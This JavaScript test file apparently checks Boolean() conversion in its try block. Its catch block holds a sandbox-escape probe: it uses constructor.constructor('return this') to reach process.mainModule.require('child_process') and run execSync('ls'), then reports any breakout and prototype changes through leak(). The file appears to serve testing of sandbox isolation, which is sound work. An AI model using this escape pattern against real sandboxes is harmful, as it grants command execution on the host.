try {
    var x;
    if (typeof Boolean(x = 0) !== 'boolean') {
        $ERROR('#1.1: typeof Boolean(x=0) should be "boolean", actual is "' + typeof Boolean(x = 0) + '"');
    }
    if (Boolean(x = 0) !== false) {
        $ERROR('#1.2: Boolean(x=0) should be false');
    }
    if (typeof Boolean(x = 1) !== 'boolean') {
        $ERROR('#2.1: typeof Boolean(x=1) should be "boolean", actual is "' + typeof Boolean(x = 1) + '"');
    }
    if (Boolean(x = 1) !== true) {
        $ERROR('#2.2: Boolean(x=1) should be true');
    }
    if (typeof Boolean(x = false) !== 'boolean') {
        $ERROR('#3.1: typeof Boolean(x=false) should be "boolean", actual is "' + typeof Boolean(x = false) + '"');
    }
    if (Boolean(x = false) !== false) {
        $ERROR('#3.2: Boolean(x=false) should be false');
    }
    if (typeof Boolean(x = true) !== 'boolean') {
        $ERROR('#4.1: typeof Boolean(x=true) should be "boolean", actual is "' + typeof Boolean(x = true) + '"');
    }
    if (Boolean(x = true) !== true) {
        $ERROR('#4.2: Boolean(x=true) should be true');
    }
    if (typeof Boolean(x = null) !== 'boolean') {
        $ERROR('#5.1: typeof Boolean(x=null) should be "boolean", actual is "' + typeof Boolean(x = null) + '"');
    }
    if (Boolean(x = null) !== false) {
        $ERROR('#5.2: Boolean(x=null) should be false');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}